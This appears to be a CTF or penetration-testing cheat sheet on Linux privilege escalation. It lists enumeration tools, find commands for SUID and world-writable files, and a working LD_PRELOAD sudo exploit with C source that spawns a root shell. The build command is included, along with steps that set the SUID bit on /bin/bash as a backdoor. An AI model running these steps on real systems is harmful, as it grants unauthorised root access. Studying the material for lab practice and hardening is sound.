# Linux Enumeration
---
## Tools & Resources
- LinPeas: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS

- LinEnum: https://github.com/rebootuser/LinEnum

- LES (Linux Exploit Suggester): https://github.com/mzet-/linux-exploit-suggester

- Linux Smart Enumeration: https://github.com/diego-treitos/linux-smart-enumeration

- Linux Priv Checker: https://github.com/linted/linuxprivchecker

- Priv Esc Resource: https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist
---
- sudo -l - see what can be run as sudo for current user
- cat /etc/passwd | cut -d ":" -f 1

- find . -name flag1.txt: find the file named “flag1.txt” in the current directory

- find /home -name flag1.txt: find the file names “flag1.txt” in the /home directory

- find / -type d -name config: find the directory named config under “/”

- find / -type f -perm 0777: find files with the 777 permissions (files readable, writable, and executable by all users)

- find / -perm a=x: find executable files

- find /home -user frank: find all files for user “frank” under “/home”

- find / -mtime 10: find files that were modified in the last 10 days

- find / -atime 10: find files that were accessed in the last 10 day

- find / -cmin -60: find files changed within the last hour (60 minutes)

- find / -amin -60: find files accesses within the last hour (60 minutes)

- find / -size 50M: find files with a 50 MB size

- find / -writable -type d 2>/dev/null : Find world-writeable folders

- find / -perm -222 -type d 2>/dev/null: Find world-writeable folders

- find / -perm -o w -type d 2>/dev/null: Find world-writeable folders

- find / -perm -o x -type d 2>/dev/null : Find world-executable folders

- find / -perm -u=s -type f 2>/dev/null: Find files with the SUID bit, which allows us to run the file with a higher privilege level than the current user.

---
if LD_PRELOAD in sudo -l output

Check for LD_PRELOAD (with the env_keep option)
Write a simple C code compiled as a share object (.so extension) file
Run the program with sudo rights and the LD_PRELOAD option pointing to our .so file
The C code will simply spawn a root shell and can be written as follows;
#include <stdio.h>
```
#include <sys/types.h>

#include <stdlib.h>

void _init() {

unsetenv("LD_PRELOAD");

setgid(0);

setuid(0);

system("/bin/bash");

}
```
We can save this code as shell.c and compile it using gcc into a shared object file using the following parameters;

`gcc -fPIC -shared -o shell.so shell.c -nostartfiles`

set suid bit on /bin/bash `chmod +s /bin/bash`

run `bash -p`
